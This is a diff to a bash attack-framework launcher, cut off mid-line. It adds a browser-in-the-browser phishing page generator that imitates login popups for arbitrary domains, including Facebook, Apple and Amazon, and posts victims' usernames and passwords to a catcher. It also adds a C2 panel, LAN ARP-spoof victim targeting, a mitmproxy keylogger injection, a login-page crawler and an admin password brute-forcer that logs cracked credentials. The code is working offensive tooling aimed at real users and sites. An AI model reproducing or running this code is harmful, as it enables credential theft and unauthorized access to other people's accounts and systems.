@@ -75,6 +75,44 @@ ask() {
     read -r REPLY
 }
 
+# Validate IPv4 — returns 0 if valid, 1 if not
+valid_ip() {
+    local ip="$1"
+    [[ "$ip" =~ ^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$ ]] || return 1
+    local o
+    for o in "${BASH_REMATCH[@]:1}"; do (( o <= 255 )) || return 1; done
+    return 0
+}
+
+# Prompt for victim IP with validation loop; sets VICTIM_IP
+ask_victim_ip() {
+    local _prompt="${1:-Victim IP}"
+    local _allow_blank="${2:-}"   # pass "optional" to allow empty answer
+    while true; do
+        ask "$_prompt"
+        if [ -z "$REPLY" ]; then
+            [ "$_allow_blank" = "optional" ] && return 0
+            err "IP address required — cannot be blank."
+            continue
+        fi
+        if valid_ip "$REPLY"; then
+            local _candidate="$REPLY"
+            # Warn if looks like a public/WAN IP (not RFC-1918)
+            local _f1; _f1=$(echo "$_candidate" | cut -d. -f1)
+            local _f2; _f2=$(echo "$_candidate" | cut -d. -f2)
+            if ! { [ "$_f1" = "10" ] || [ "$_f1" = "172" -a "$_f2" -ge 16 -a "$_f2" -le 31 ] || [ "$_f1" = "192" -a "$_f2" = "168" ]; }; then
+                warn "'$_candidate' looks like a public IP — ARP spoof only works on LAN (192.168.x.x / 10.x.x.x)"
+                ask "Use it anyway? [y/N]:"
+                [[ "${REPLY,,}" == "y" ]] || continue
+            fi
+            VICTIM_IP="$_candidate"
+            return 0
+        else
+            err "Invalid IP: '$REPLY'  (must be 0-255 in each octet, e.g. 192.168.1.42)"
+        fi
+    done
+}
+
 choose() {
     echo -e "\n  ${W}$1${N}"
     local i=1
@@ -115,15 +153,20 @@ ensure_c2() {
     _running_port=$(ss -tlnp 2>/dev/null | grep -oE ':(88[0-9]{2}|89[0-3][0-9]) ' | tr -d ': ' | head -1)
 
     if [ -n "$_running_port" ]; then
-        ok "C2 already running on :$_running_port"
         C2_ACTIVE_PORT="$_running_port"
+        echo ""
+        echo -e "  ${G}╔══════════════════════════════════════════════╗${N}"
+        echo -e "  ${G}║  C2 PANEL:  http://localhost:$C2_ACTIVE_PORT/panel  ║${N}"
+        echo -e "  ${G}╚══════════════════════════════════════════════╝${N}"
+        echo ""
+        xdg-open "http://localhost:$C2_ACTIVE_PORT/panel" 2>/dev/null &
         return
     fi
 
     info "Starting C2 server (will auto-select free port from 8888)..."
     mkdir -p "$OP/logs"
     LOG_DIR="$OP/logs" PAYLOAD_DIR="$OP/payloads" \
-        nohup python3 "$C2_DIR/c2_server.py" > "$OP/logs/c2_auto.log" 2>&1 &
+        C2_TLS=0 nohup python3 "$C2_DIR/c2_server.py" > "$OP/logs/c2_auto.log" 2>&1 &
     C2_PID=$!
 
     # Wait up to 8s for it to bind and write ports file
@@ -191,7 +234,7 @@ body{font-family:Arial,sans-serif;background:#1a3a6e;min-height:100vh;display:fl
 <div class="dots"><span class="dr" onclick="hideB()"></span><span class="dy"></span><span class="dg"></span></div>
 <div class="ub"><span class="lock">&#128274;</span><span><strong>heilige.com</strong><span style="color:#888">/staff/login</span></span></div>
 <button class="xbtn" onclick="hideB()">&#x2715;</button></div>
-<div class="bd"><h2>Sign in</h2><p class="sub">Office of the President — Staff Portal</p>
+<div class="bd"><h2>Sign in</h2><p class="sub">Staff Portal Login</p>
 <form id="lf" onsubmit="doSub(event)">
 <label>Username or email</label><input type="text" id="fu" placeholder="username" required>
 <label>Password</label><input type="password" id="fp" placeholder="password" required>
@@ -1099,11 +1142,11 @@ CATCHEOF
   <div class="bw">
     <div class="tb">
       <div class="dots"><span class="dr" onclick="hideBitB()"></span><span class="dy"></span><span class="dg"></span></div>
-      <div class="ub"><span class="lock">&#128274;</span><span><strong>heilige.com</strong><span style="color:#888">/M02op-gm/login</span></span></div>
+      <div class="ub"><span class="lock">&#128274;</span><span><strong>portal.example.com</strong><span style="color:#888">/login</span></span></div>
       <button class="close-btn" onclick="hideBitB()">&#x2715;</button>
     </div>
     <div class="bd">
-      <h2>Sign in</h2><p class="sub">Office of the President Staff Portal</p>
+      <h2>Sign in</h2><p class="sub">Staff Portal Login</p>
       <form id="lf" onsubmit="submitLogin(event)">
         <label>Username or email</label><input type="text" id="fu" autocomplete="username" placeholder="username" required>
         <label>Password</label><input type="password" id="fp" autocomplete="current-password" placeholder="password" required>
@@ -1403,9 +1446,33 @@ configure() {
 
     # Target domain
     [ -z "$TARGET_DOMAIN" ] && TARGET_DOMAIN=""
-    info "Mirror target: ${W}$TARGET_DOMAIN${N}"
-    info "(This is the real site the proxy clones — victim sees YOUR link, gets this site's content)"
-    ask "Change mirror target? (Enter to keep '$TARGET_DOMAIN')"
+    if [ "$DIRECTION" = "remote" ] && { [ "$WEAPON" = "1" ] || [[ "$WEAPON" == *"BitB"* ]] || [[ "$WEAPON" == *"bitb"* ]]; }; then
+        info "Target domain: ${W}$TARGET_DOMAIN${N}"
+        info "(Used to pick the matching theme + shown in the fake address bar of the popup)"
+        info "  e.g. facebook.com → facebook theme,  instagram.com → instagram theme"
+        info "  Any domain → auto-generated branded login page"
+    elif [ "$DIRECTION" = "physical" ]; then
+        info "Target domain: ${W}$TARGET_DOMAIN${N}"
+        info "(Domain to intercept on the LAN — keylogger injected into this site's traffic)"
+        info "  e.g. facebook.com  — ARP spoof redirects victim's traffic through your machine"
+        ask "Change target domain? (Enter to keep '$TARGET_DOMAIN')"
+        if [ -n "$REPLY" ]; then TARGET_DOMAIN="$REPLY"; ok "Target set to: $TARGET_DOMAIN"; else ok "Keeping: $TARGET_DOMAIN"; fi
+        echo ""
+        # Ask for victim IP upfront — scan is optional
+        info "Victim IP on the LAN (or leave blank to scan and pick later):"
+        ask_victim_ip "Victim IP (or leave blank to scan at Step 4)" "optional"
+        if [ -n "$VICTIM_IP" ]; then
+            ok "Victim IP: $VICTIM_IP"
+        else
+            VICTIM_IP=""
+            info "Will scan LAN and ask at Step 4"
+        fi
+        return
+    else
+        info "Mirror target: ${W}$TARGET_DOMAIN${N}"
+        info "(Real site the proxy clones — victim sees YOUR link, gets this site's content)"
+    fi
+    ask "Change target? (Enter to keep '$TARGET_DOMAIN')"
     if [ -n "$REPLY" ]; then
         TARGET_DOMAIN="$REPLY"
         ok "Target set to: $TARGET_DOMAIN"
@@ -1610,6 +1677,80 @@ CFEOF
 # REMOTE FLOWS
 # ══════════════════════════════════════════════════════════════
 
+# Generate a dynamic BitB page for any domain not covered by built-in themes
+_generate_bitb_page() {
+    local domain="$1"
+    # Extract a human-readable service name: strip www./m. prefix and TLD
+    local svc
+    svc=$(echo "$domain" | sed 's/^www\.\|^m\.\|^app\.\|^accounts\.//' | sed 's/\.[a-z]*$//' | sed 's/[-.]/ /g' | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1))substr($i,2)}1')
+    local favicon_url="https://${domain}/favicon.ico"
+    cat <<DYNEOF
+<!DOCTYPE html><html><head><meta charset="UTF-8">
+<title>${svc} – Sign In</title>
+<style>*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center;}
+.card{background:white;border-radius:8px;padding:40px;width:380px;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.12)}
+.svc-icon{width:48px;height:48px;margin:0 auto 12px;display:block;border-radius:8px}
+.card h1{font-size:22px;font-weight:700;color:#1c1c1c;margin-bottom:6px}
+.card .sub{font-size:14px;color:#666;margin-bottom:24px}
+.card input{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:6px;font-size:15px;color:#1c1c1c;margin-bottom:12px;outline:none}
+.card input:focus{border-color:#4a90e2;box-shadow:0 0 0 3px rgba(74,144,226,.15)}
+.card .login-btn{width:100%;padding:13px;background:#4a90e2;color:white;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;margin-top:4px}
+.card .forgot{display:block;margin-top:14px;color:#4a90e2;font-size:14px;text-decoration:none}
+#ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:9999;align-items:center;justify-content:center}
+#ov.show{display:flex}
+.bw{width:440px;border-radius:10px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5);animation:popIn .15s ease-out}
+@keyframes popIn{from{transform:scale(.92);opacity:0}to{transform:scale(1);opacity:1}}
+.tb{background:#dee1e6;padding:8px 10px 6px;display:flex;align-items:center;gap:8px}
+.dots{display:flex;gap:6px}.dots span{width:13px;height:13px;border-radius:50%;display:block}
+.dr{background:#ff5f57}.dy{background:#ffbd2e}.dg{background:#28c840}
+.ub{flex:1;background:white;border-radius:20px;padding:3px 12px;display:flex;align-items:center;gap:6px;font-size:13px;color:#333}
+.lock{color:#1a73e8;font-size:12px}.xbtn{background:none;border:none;font-size:18px;cursor:pointer;color:#666}
+.bd{background:white;padding:32px 36px 28px;text-align:center}
+.bd .ico{width:40px;height:40px;margin:0 auto 10px;display:block;border-radius:6px}
+.bd h2{font-size:20px;font-weight:700;color:#1c1c1c;margin-bottom:6px}
+.bd .sub2{font-size:13px;color:#888;margin-bottom:22px}
+.bd input{width:100%;padding:11px 13px;border:1px solid #ddd;border-radius:6px;font-size:15px;color:#1c1c1c;margin-bottom:12px;outline:none;box-sizing:border-box}
+.bd input:focus{border-color:#4a90e2;box-shadow:0 0 0 3px rgba(74,144,226,.15)}
+.bd .bs{width:100%;padding:12px;background:#4a90e2;color:white;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;margin-top:4px}
+.bd .err{display:none;color:#d93025;font-size:13px;margin-top:-6px;margin-bottom:10px}
+</style></head><body>
+<div class="card">
+<img class="svc-icon" src="${favicon_url}" onerror="this.style.display='none'" alt="">
+<h1>Sign in to ${svc}</h1>
+<p class="sub">Enter your credentials to continue</p>
+<input type="text" placeholder="Email or username" onfocus="showB()">
+<input type="password" placeholder="Password" onfocus="showB()">
+<button class="login-btn" onclick="showB()">Sign in</button>
+<a class="forgot" href="#">Forgot password?</a>
+</div>
+<div id="ov"><div class="bw">
+<div class="tb">
+<div class="dots"><span class="dr" onclick="hideB()"></span><span class="dy"></span><span class="dg"></span></div>
+<div class="ub"><span class="lock">&#128274;</span><span><strong>${domain}</strong><span style="color:#888">/login</span></span></div>
+<button class="xbtn" onclick="hideB()">&#x2715;</button></div>
+<div class="bd">
+<img class="ico" src="${favicon_url}" onerror="this.style.display='none'" alt="">
+<h2>Sign in to ${svc}</h2><p class="sub2">Use your ${svc} account</p>
+<form id="lf" onsubmit="doSub(event)">
+<input type="text" id="fu" placeholder="Email or username" required>
+<input type="password" id="fp" placeholder="Password" required>
+<p class="err" id="em">Incorrect email or password. Please try again.</p>
+<button class="bs" type="submit">Sign in</button>
+</form></div></div></div>
+<script>
+function showB(){document.getElementById('ov').classList.add('show');setTimeout(()=>document.getElementById('fu').focus(),150);}
+function hideB(){document.getElementById('ov').classList.remove('show');}
+document.getElementById('ov').addEventListener('click',function(e){if(e.target===this)hideB();});
+function doSub(e){e.preventDefault();
+var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
+fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb'})}).catch(()=>{});
+var b=e.target.querySelector('.bs');b.textContent='Signing in\u2026';b.disabled=true;
+setTimeout(()=>{document.getElementById('em').style.display='block';b.textContent='Sign in';b.disabled=false;document.getElementById('fp').value='';document.getElementById('fp').focus();},1800);}
+</script></body></html>
+DYNEOF
+}
+
 remote_bitb() {
     ensure_c2
     banner
@@ -1622,38 +1763,112 @@ remote_bitb() {
     # Auto-select BitB theme based on target domain
     local _theme="blank"
     case "${TARGET_DOMAIN,,}" in
-        *facebook*)  _theme="facebook" ;;
-        *google*|*gmail*|*youtube*) _theme="google" ;;
+        *facebook*)                         _theme="facebook" ;;
+        *google*|*gmail*|*youtube*)         _theme="google" ;;
         *outlook*|*microsoft*|*live*|*hotmail*) _theme="outlook" ;;
-        *julazone*)  _theme="julazone" ;;
-        *gov*|*government*|*portal*) _theme="gov-portal" ;;
+        *instagram*)                        _theme="instagram" ;;
+        *twitter*|*x.com*)                  _theme="twitter" ;;
+        *linkedin*)                         _theme="linkedin" ;;
+        *tiktok*)                           _theme="tiktok" ;;
+        *apple*|*icloud*|*appleid*)         _theme="apple" ;;
+        *discord*)                          _theme="discord" ;;
+        *snapchat*)                         _theme="snapchat" ;;
+        *reddit*)                           _theme="reddit" ;;
+        *steam*|*steamcommunity*)           _theme="steam" ;;
+        *amazon*)                           _theme="amazon" ;;
+        *julazone*)                         _theme="julazone" ;;
+        *gov*|*government*|*portal*)        _theme="gov-portal" ;;
     esac
-    if [ -f "$BITB_DIR/themes/$_theme/index.html" ]; then
+    # Show auto-detected theme and let operator confirm or override
+    echo ""
+    info "Auto-detected theme: ${W}$_theme${N}  (from: $TARGET_DOMAIN)"
+    echo ""
+    echo -e "  Available themes:"
+    local _i=1 _themes_list=()
+    for _d in "$BITB_DIR/themes"/*/; do
+        _tname=$(basename "$_d")
+        [ "$_tname" = "https" ] && continue   # skip non-theme dirs
+        _themes_list+=("$_tname")
+        if [ "$_tname" = "$_theme" ]; then
+            echo -e "  ${G}[$_i] $_tname  ← auto-selected${N}"
+        else
+            echo -e "  ${C}[$_i] $_tname${N}"
+        fi
+        (( _i++ ))
+    done
+    echo -e "  ${C}[d] dynamic${N}  — generate for '$TARGET_DOMAIN' (any unlisted site)"
+    echo ""
+    ask "Pick theme number, 'd' for dynamic, or Enter to use '$_theme'"
+    if [ -n "$REPLY" ]; then
+        if [ "$REPLY" = "d" ] || [ "$REPLY" = "D" ]; then
+            _theme="__dynamic__"
+        elif [[ "$REPLY" =~ ^[0-9]+$ ]]; then
+            local _pick=$(( REPLY - 1 ))
+            if [ "$_pick" -ge 0 ] && [ "$_pick" -lt "${#_themes_list[@]}" ]; then
+                _theme="${_themes_list[$_pick]}"
+                ok "Theme set to: $_theme"
+            else
+                warn "Invalid number — keeping '$_theme'"
+            fi
+        else
+            # Typed a name directly
+            if [ -d "$BITB_DIR/themes/$REPLY" ]; then
+                _theme="$REPLY"
+                ok "Theme set to: $_theme"
+            else
+                warn "Theme '$REPLY' not found — keeping '$_theme'"
+            fi
+        fi
+    fi
+
+    if [ "$_theme" = "__dynamic__" ]; then
+        _generate_bitb_page "$TARGET_DOMAIN" > "$BITB_DIR/index.html"
+        ok "BitB theme: dynamic (generated for $TARGET_DOMAIN)"
+    elif [ -f "$BITB_DIR/themes/$_theme/index.html" ]; then
         cp "$BITB_DIR/themes/$_theme/index.html" "$BITB_DIR/index.html"
-        ok "BitB theme: $_theme (matched $TARGET_DOMAIN)"
+        ok "BitB theme: $_theme"
+    elif [ -n "$TARGET_DOMAIN" ]; then
+        _generate_bitb_page "$TARGET_DOMAIN" > "$BITB_DIR/index.html"
+        ok "BitB theme: dynamic (generated for $TARGET_DOMAIN)"
     else
-        ok "BitB theme: default (no match for $TARGET_DOMAIN)"
+        cp "$BITB_DIR/themes/blank/index.html" "$BITB_DIR/index.html"
+        ok "BitB theme: blank"
     fi
 
     step "4a" "Starting BitB catcher server..."
-    pkill -f "catcher.py" 2>/dev/null
-    cd "$BITB_DIR"
-    nohup python3 catcher.py > /tmp/bitb_server.log 2>&1 &
+    pkill -f "catcher.py" 2>/dev/null; sleep 1
+    local _abs_op _abs_bitb _clog
+    _abs_op="$(cd "$OP" && pwd)"
+    _abs_bitb="$(cd "$BITB_DIR" && pwd)"
+    _clog="/tmp/bitb_server_${UID}.log"
+    rm -f "$_clog"
+    LOG_DIR="$_abs_op/logs" nohup python3 "$_abs_bitb/catcher.py" > "$_clog" 2>&1 &
     sleep 2
-    CATCHER_PORT=$(grep "CATCHER_PORT\|on port\|BitB catcher" /tmp/bitb_server.log 2>/dev/null | grep -oE '[0-9]{4,5}' | head -1)
-    ok "Catcher running on :${CATCHER_PORT:-8082}"
+    if ss -tlnp 2>/dev/null | grep -q ":8082 "; then
+        ok "Catcher running on :8082"
+        ok "Credentials → $_abs_op/logs/credentials.txt  (same as C2 panel)"
+    else
+        err "Catcher failed to auto-start — run this in a new terminal to fix it:"
+        echo ""
+        echo -e "  ${W}cd $_abs_bitb && LOG_DIR=\"$_abs_op/logs\" python3 catcher.py${N}"
+        echo ""
+        tail -5 "$_clog" 2>/dev/null
+        ask "Press Enter once you've started the catcher manually, or Ctrl+C to abort"
+    fi
+    CATCHER_PORT=8082
 
     open_tunnel 8082
 
     step "4c" "Waiting for credentials..."
     echo ""
     info "When victim opens the link and submits, credentials appear below:"
+    info "Also visible in C2 panel → Credentials tab"
     echo ""
 
-    step 5 "MONITOR — watching /tmp/caught.txt"
+    step 5 "MONITOR — watching $OP/logs/credentials.txt"
     echo -e "  ${Y}Ctrl+C to stop${N}\n"
     log "BitB running — tunnel: $TUNNEL_URL"
-    tail -f /tmp/caught.txt 2>/dev/null
+    tail -f "$OP/logs/credentials.txt" 2>/dev/null
 }
 
 remote_mitm_keylogger() {
@@ -1692,11 +1907,16 @@ remote_mitm_keylogger() {
     # ── Start mitmdump ────────────────────────────────────────────
     step "4c" "Starting reverse proxy on :$PROXY_PORT..."
     pkill -f mitmdump 2>/dev/null; sleep 1
+    # Strip any protocol prefix so we don't get reverse:https://https://...
+    local _proxy_target
+    _proxy_target="${TARGET_DOMAIN#http://}"
+    _proxy_target="${_proxy_target#https://}"
+    _proxy_target="${_proxy_target%%/*}"   # strip path — mitmdump needs just host
     TARGET_DOMAIN=$TARGET_DOMAIN MY_IP=$MY_IP CATCHER_PORT=$CATCHER_PORT \
     LOG_DIR=$KL_DIR/logs \
     nohup mitmdump \
         -s "$KL_DIR/inject.py" \
-        --mode "reverse:https://$TARGET_DOMAIN" \
+        --mode "reverse:https://$_proxy_target" \
         --ssl-insecure \
         -p $PROXY_PORT \
         --quiet > "$KL_DIR/proxy.log" 2>&1 &
@@ -1723,29 +1943,326 @@ remote_mitm_keylogger() {
 
 remote_drupal_brute() {
     banner
-    step 4 "LAUNCH — Drupal Brute Force"
+    step 4 "LAUNCH — CMS Brute Force"
     echo ""
-    info "Tries common passwords against the admin login"
-    warn "Flood control: max 5 attempts per 6 hours"
-    warn "Next window: check schedule"
+    info "Tries common passwords against the admin login of: ${W}$TARGET_DOMAIN${N}"
+    warn "Flood control: max 5 attempts per batch to avoid lockout"
     echo ""
 
-    step "4a" "Checking flood status..."
-    NEXT_RUN=$(crontab -l 2>/dev/null | grep drupal | head -1)
-    if [ -n "$NEXT_RUN" ]; then
-        ok "Scheduled: $NEXT_RUN"
+    # Ask for username
+    ask "Admin username to target (Enter for 'admin')"
+    local _user="${REPLY:-admin}"
+    ok "Username: $_user"
+
+    # Ask for batch size
+    ask "Attempts per batch — max before stopping (Enter for 5)"
+    local _batch="${REPLY:-5}"
+    ok "Batch size: $_batch"
+
+    step "4a" "Detecting login path..."
+    # Strip protocol and path from TARGET_DOMAIN to get base URL
+    local _base _host
+    _base="$TARGET_DOMAIN"
+    # Ensure it has a protocol
+    [[ "$_base" != http* ]] && _base="https://$_base"
+    # Strip trailing path — keep just scheme+host
+    _host=$(echo "$_base" | grep -oE '^https?://[^/]+')
+
+    # Detect CMS login path — advanced multi-strategy crawler
+    local _login_url=""
+
+    # If TARGET_DOMAIN already looks like a login URL, use it directly
+    if echo "$TARGET_DOMAIN" | grep -qiE "(login|admin|signin|user/|/auth)"; then
+        _login_url="$_base"
+        ok "Using provided URL directly: $_login_url"
     else
-        warn "No scheduled run found"
-        ask "Run now? [Y/n]"
-        if [[ ! "$REPLY" =~ ^[Nn]$ ]]; then
-            step "4b" "Running login attempts..."
-            echo ""
-            cd /tmp && python3 -u drupal_login_targeted.py
+        info "Running advanced login path crawler..."
+        _login_url=$(python3 - "$_host" <<'CRAWLPY'
+import sys, re, urllib.request, urllib.parse, urllib.error, ssl, html
+
+TARGET = sys.argv[1].rstrip("/")
+ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+HEADERS = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+LOGIN_KEYWORDS = re.compile(r'log.?in|sign.?in|user/login|admin/login|wp-login|/auth|/session', re.I)
+LOGIN_FORM_RE  = re.compile(r'type=["\']password["\']|name=["\']pass["\']|name=["\']pwd["\']', re.I)
+TITLE_RE       = re.compile(r'<title>[^<]*(log.?in|sign.?in)[^<]*</title>', re.I)
+PATH_IN_JS_RE  = re.compile(r'["\'/]((?:[a-z0-9_-]+/){0,4}(?:login|signin|admin|user)[^"\'<>\s]*)["\']', re.I)
+
+def fetch(url, timeout=8):
+    try:
+        req = urllib.request.Request(url, headers=HEADERS)
+        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+            return r.read().decode("utf-8","replace"), r.geturl()
+    except Exception:
+        return "", url
+
+def is_login_page(html_text):
+    return bool(LOGIN_FORM_RE.search(html_text) or TITLE_RE.search(html_text))
+
+def make_abs(href, base):
+    if not href or href.startswith(("#","javascript","mailto","tel")):
+        return None
+    if href.startswith("//"):
+        return "https:" + href
+    if href.startswith("http"):
+        return href if TARGET in href else None  # stay on same host
+    return TARGET + "/" + href.lstrip("/")
+
+visited = set()
+found = None
+
+# ── Strategy 1: robots.txt (often lists /admin, /user) ──────────────
+body, _ = fetch(TARGET + "/robots.txt")
+for line in body.splitlines():
+    if line.lower().startswith("disallow:") or line.lower().startswith("allow:"):
+        path = line.split(":",1)[1].strip()
+        if LOGIN_KEYWORDS.search(path):
+            url = TARGET + path.rstrip("*")
+            b2, final = fetch(url)
+            if is_login_page(b2):
+                found = final; break
+
+# ── Strategy 2: sitemap.xml ─────────────────────────────────────────
+if not found:
+    for sm in ["/sitemap.xml", "/sitemap_index.xml", "/sitemap"]:
+        body, _ = fetch(TARGET + sm)
+        urls = re.findall(r'<loc>([^<]+)</loc>', body)
+        for u in urls:
+            if LOGIN_KEYWORDS.search(u) and TARGET in u:
+                b2, final = fetch(u)
+                if is_login_page(b2):
+                    found = final; break
+        if found: break
+
+# ── Strategy 3: Homepage link extraction (BFS depth 2) ──────────────
+if not found:
+    queue = [TARGET + "/"]
+    for depth in range(2):
+        next_q = []
+        for page_url in queue[:8]:
+            if page_url in visited: continue
+            visited.add(page_url)
+            body, _ = fetch(page_url)
+            hrefs = re.findall(r'href=["\']([^"\']+)["\']', body, re.I)
+            hrefs += re.findall(r"href='([^']+)'", body, re.I)
+            for href in hrefs:
+                href = html.unescape(href.split("?")[0] if depth==0 else href)
+                abs_url = make_abs(href, TARGET)
+                if not abs_url or abs_url in visited: continue
+                if LOGIN_KEYWORDS.search(abs_url):
+                    b2, final = fetch(abs_url)
+                    if is_login_page(b2):
+                        found = final; break
+                else:
+                    next_q.append(abs_url)
+            if found: break
+        if found: break
+        queue = next_q
+
+# ── Strategy 4: CMS fingerprint + known paths ───────────────────────
+if not found:
+    # Detect CMS from homepage
+    home, _ = fetch(TARGET + "/")
+    cms_paths = []
+    if "drupal" in home.lower() or "/sites/default/" in home:
+        cms_paths = ["/user/login","/user","/admin/content","/node/add"]
+    elif "wp-content" in home or "wordpress" in home.lower():
+        cms_paths = ["/wp-login.php","/wp-admin"]
+    elif "joomla" in home.lower() or "/components/com_" in home:
+        cms_paths = ["/administrator","/administrator/index.php"]
+    elif "typo3" in home.lower():
+        cms_paths = ["/typo3/"]
+    # Generic fallback paths
+    cms_paths += ["/login","/admin/login","/account/login","/signin",
+                  "/auth/login","/panel","/cp","/controlpanel","/backend"]
+    for path in cms_paths:
+        b2, final = fetch(TARGET + path)
+        if is_login_page(b2):
+            found = final; break
+
+# ── Strategy 5: Parse embedded JS bundles for login paths ────────────
+if not found:
+    home2, _ = fetch(TARGET + "/")
+    js_srcs = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', home2, re.I)
+    for js_src in js_srcs[:6]:
+        js_url = js_src if js_src.startswith("http") else TARGET + "/" + js_src.lstrip("/")
+        if TARGET not in js_url: continue
+        js_body, _ = fetch(js_url, timeout=10)
+        paths_in_js = PATH_IN_JS_RE.findall(js_body)
+        for p in paths_in_js:
+            p = p.strip("/")
+            if len(p) < 3 or len(p) > 60: continue
+            candidate = TARGET + "/" + p
+            if candidate in visited: continue
+            visited.add(candidate)
+            b2, final = fetch(candidate)
+            if is_login_page(b2):
+                found = final; break
+        if found: break
+
+# ── Strategy 6: Drupal settings JSON — pathPrefix + known routes ─────
+if not found:
+    home2, _ = fetch(TARGET + "/")
+    m = re.search(r'data-drupal-selector="drupal-settings-json"[^>]*>(\{.*?\})</script>', home2, re.S)
+    if m:
+        import json as _json
+        try:
+            cfg = _json.loads(m.group(1))
+            prefix = cfg.get("path", {}).get("pathPrefix", "")
+            for p in ["user/login", "user", "admin", "admin/content"]:
+                candidate = TARGET + "/" + prefix + p
+                b2, final = fetch(candidate)
+                if is_login_page(b2):
+                    found = final; break
+        except Exception:
+            pass
+
+# ── Strategy 7: Wordlist path brute-force ────────────────────────────
+if not found:
+    WORDLIST = ["login","admin","user","signin","auth","portal","panel",
+                "staff","member","account","secure","private","backoffice",
+                "backend","manage","manager","cp","cms","dashboard","control",
+                "wp-admin","administrator","adminpanel","admincp","useradmin",
+                "siteadmin","webadmin","system","intranet","extranet","office",
+                "staff-portal","employee","hr","support","helpdesk","crm"]
+    for word in WORDLIST:
+        for path in [f"/{word}", f"/{word}/login", f"/{word}/index.php", f"/{word}/signin"]:
+            b2, final = fetch(TARGET + path)
+            if is_login_page(b2):
+                found = final; break
+        if found: break
+
+if found:
+    print(found)
+else:
+    print("")
+CRAWLPY
+)
+        if [ -n "$_login_url" ]; then
+            ok "Login page found: $_login_url"
         fi
     fi
 
+    # Last resort — ask the operator
+    if [ -z "$_login_url" ]; then
+        warn "Advanced crawler found no login page."
+        ask "Enter full login URL manually (e.g. https://site.com/user/login)"
+        while [ -z "$REPLY" ]; do
+            warn "URL required."
+            ask "Enter full login URL"
+        done
+        _login_url="$REPLY"
+        ok "Using: $_login_url"
+    fi
+
+    step "4b" "Running login attempts against $_login_url ..."
+    echo ""
+
+    # Write and run the brute force script
+    local _creds_out="$OP/logs/credentials.txt"
+    python3 -u - <<PYEOF
+import requests, re, sys, time, os
+
+TARGET    = "$_login_url"
+USERNAME  = "$_user"
+MAX       = int("$_batch")
+CREDS_OUT = "$_creds_out"
+
+PASSWORDS = [
+    # Common defaults
+    "admin","admin123","Admin123","admin@123","Admin@123",
+    "password","Password1","password123","Password123",
+    "admin2024","Admin2024","admin2023","Admin2023",
+    "admin2022","Admin2022","admin2021","Admin2021",
+    "root","root123","toor","letmein","welcome",
+    # CMS defaults
+    "drupal","Drupal","wordpress","joomla",
+    # Name/org patterns (using target hostname)
+    "$(echo "$_host" | grep -oE '[a-z0-9]+\.(gov|com|org|net)' | cut -d. -f1 | head -1)@123",
+    "$(echo "$_host" | grep -oE '[a-z0-9]+\.(gov|com|org|net)' | cut -d. -f1 | head -1)2024",
+    "$(echo "$_host" | grep -oE '[a-z0-9]+\.(gov|com|org|net)' | cut -d. -f1 | head -1)2023",
+    "changeme","changeme123","test","test123","pass","pass123",
+    "qwerty","qwerty123","abc123","111111","123456","1234567890",
+]
+PASSWORDS = [p for p in PASSWORDS if p and len(p) > 2]
+
+s = requests.Session()
+s.verify = False
+requests.packages.urllib3.disable_warnings()
+
+def get_tokens(url):
+    try:
+        r = s.get(url, timeout=15)
+        inputs = dict(re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']', r.text))
+        inputs.update(dict(re.findall(r'<input[^>]+value=["\']([^"\']*)["\'][^>]+name=["\']([^"\']+)["\']', r.text)))
+        return r, inputs
+    except Exception as e:
+        return None, {}
+
+attempts = 0
+found = False
+for pwd in PASSWORDS:
+    if attempts >= MAX:
+        print(f"\n[!] Reached batch limit of {MAX}. Run again to continue.")
+        break
+
+    r0, inputs = get_tokens(TARGET)
+    if r0 is None:
+        print(f"[-] Cannot reach {TARGET}")
+        break
+
+    # Build POST data — handle Drupal, WordPress, generic
+    post = {"name": USERNAME, "pass": pwd, "op": "Log in",
+            "form_id": inputs.get("form_id","user_login_form")}
+    for k in ["form_build_id","form_token","_token","csrf_token"]:
+        if k in inputs:
+            post[k] = inputs[k]
+
+    try:
+        r = s.post(TARGET, data=post, allow_redirects=False, timeout=15)
+    except Exception as e:
+        print(f"[-] Request error: {e}")
+        time.sleep(2)
+        continue
+
+    attempts += 1
+    status = f"HTTP {r.status_code}"
+
+    if r.status_code in (301, 302):
+        loc = r.headers.get("Location","")
+        if any(x in loc.lower() for x in ["admin","dashboard","panel","user","account"]):
+            print(f"[{attempts}] {pwd}: {status} → REDIRECT to {loc[:60]}")
+            print(f"\n[+] *** SUCCESS! user={USERNAME} pass={pwd} ***")
+            with open(CREDS_OUT,"a") as f:
+                f.write(f"[BRUTE] user={USERNAME!r}  pass={pwd!r}  src={TARGET}\n")
+            found = True
+            break
+        else:
+            print(f"[{attempts}] {pwd}: {status} → wrong (redirect: {loc[:50]})")
+    elif "flood" in r.text.lower() or "too many" in r.text.lower():
+        print(f"[{attempts}] {pwd}: FLOOD CONTROL ACTIVE — stopping")
+        break
+    elif r.status_code == 200:
+        if any(x in r.text.lower() for x in ["unrecognized","incorrect","invalid","failed","wrong","error"]):
+            print(f"[{attempts}] {pwd}: WRONG PASSWORD")
+        elif USERNAME.lower() in r.text.lower() or "logout" in r.text.lower() or "dashboard" in r.text.lower():
+            print(f"[{attempts}] {pwd}: HTTP 200 → POSSIBLE SUCCESS (check manually)")
+            with open(CREDS_OUT,"a") as f:
